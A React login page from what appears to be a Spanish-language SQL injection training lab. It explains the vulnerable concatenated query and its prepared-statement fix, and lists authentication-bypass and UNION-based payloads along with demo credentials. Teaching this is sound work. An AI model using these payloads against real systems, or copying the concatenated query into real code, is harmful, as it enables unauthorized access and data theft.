import { useState } from 'react';
import { login } from '../api';

function Login() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [result, setResult] = useState(null);
  const [error, setError] = useState(null);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setResult(null);
    setError(null);

    try {
      const data = await login(username, password);
      setResult(data);
    } catch (err) {
      setError(err.message);
    }
  };

  return (
    <div className="page-container">
      <h1 className="page-title">🔐 Login - SQL Injection</h1>

      <div className="vuln-info">
        <h3>🔓 VULNERABILIDAD: SQL Injection (SQLi)</h3>
        <p>
          <strong>Problema:</strong> El backend concatena directamente los inputs del usuario 
          en la consulta SQL sin usar prepared statements ni sanitización.
        </p>
        <p>
          <strong>Código vulnerable (backend):</strong>
        </p>
        <div className="code-block">
          <pre>{`const query = \`SELECT * FROM users 
  WHERE username = '\${username}' 
  AND password = '\${password}'\`;`}</pre>
        </div>
        <p>
          <strong>Explotación:</strong> Al ingresar <code>admin' OR '1'='1</code> como 
          usuario, la consulta se convierte en:
        </p>
        <div className="code-block">
          <pre>{`SELECT * FROM users 
WHERE username = 'admin' OR '1'='1' 
AND password = 'cualquier_cosa'`}</pre>
        </div>
        <p>
          La condición <code>'1'='1'</code> siempre es verdadera, permitiendo el bypass 
          de autenticación.
        </p>
        <p>
          <strong>Mitigación:</strong> Usar prepared statements con placeholders:
        </p>
        <div className="code-block">
          <pre>{`db.get("SELECT * FROM users WHERE username = ? AND password = ?", 
       [username, password], callback);`}</pre>
        </div>
      </div>

      <div className="card">
        <h2 className="card-title">Formulario de Login</h2>
        
        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <label htmlFor="username">Usuario:</label>
            <input
              type="text"
              id="username"
              className="form-control"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              placeholder="Ingresa el usuario"
              required
            />
          </div>

          <div className="form-group">
            <label htmlFor="password">Contraseña:</label>
            <input
              type="password"
              id="password"
              className="form-control"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Ingresa la contraseña"
              required
            />
          </div>

          <button type="submit" className="btn btn-primary">
            Iniciar Sesión
          </button>
        </form>

        {result && (
          <div className="result-box result-success">
            <h3>✅ Login Exitoso</h3>
            <p><strong>Usuario:</strong> {result.user.username}</p>
            <p><strong>Email:</strong> {result.user.email}</p>
            <p><strong>Rol:</strong> {result.user.role}</p>
            <p><strong>ID:</strong> {result.user.id}</p>
            <div className="code-block">
              <pre>{JSON.stringify(result, null, 2)}</pre>
            </div>
          </div>
        )}

        {error && (
          <div className="result-box result-error">
            <h3>❌ Error</h3>
            <p>{error}</p>
          </div>
        )}
      </div>

      <div className="card">
        <h2 className="card-title">🧪 Payloads de Prueba</h2>
        
        <h3>1. Bypass de Autenticación</h3>
        <div className="code-block">
          <pre>Usuario: admin' OR '1'='1{'\n'}Contraseña: cualquier_cosa</pre>
        </div>

        <h3>2. Bypass con Comentario SQL</h3>
        <div className="code-block">
          <pre>Usuario: admin'--{'\n'}Contraseña: (dejar vacío o cualquier cosa)</pre>
        </div>
        <p>El <code>--</code> comenta el resto de la query.</p>

        <h3>3. Union-based SQLi (para extraer datos)</h3>
        <div className="code-block">
          <pre>Usuario: ' UNION SELECT 1,2,3,4,5--{'\n'}Contraseña: x</pre>
        </div>

        <h3>4. Credenciales Válidas (de la base de datos)</h3>
        <div className="code-block">
          <pre>Usuario: admin{'\n'}Contraseña: admin123</pre>
        </div>
        <div className="code-block">
          <pre>Usuario: usuario{'\n'}Contraseña: pass123</pre>
        </div>
      </div>

      <div className="alert alert-info">
        <strong>💡 Tip:</strong> Copia y pega los payloads de arriba en el formulario 
        para probar la vulnerabilidad SQL Injection. Observa cómo puedes autenticarte 
        sin conocer la contraseña real.
      </div>
    </div>
  );
}

export default Login;
